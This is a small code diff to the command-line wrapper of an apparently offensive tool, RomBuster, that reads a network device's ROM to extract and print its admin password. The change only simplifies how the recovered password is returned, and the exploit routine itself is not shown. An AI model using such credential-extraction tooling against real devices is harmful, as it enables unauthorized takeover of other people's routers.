@@ -46,12 +46,11 @@ class RomBusterCLI(RomBuster, Badges):
 
         if response is not None:
             self.print_process(f"({host}) - accessing device rom...")
-            creds = self.exploit(response)
+            password = self.exploit(response)
 
-            if creds is not None:
+            if password is not None:
                 self.print_process(f"({host}) - extracting admin password...")
-                for username in creds.keys():
-                    return f"({host}) - password: {creds[username]}"
+                return f"({host}) - password: {password}"
             self.print_error(f"({host}) - rom access denied!")
             return None
         self.print_error(f"({host}) - connection rejected!")
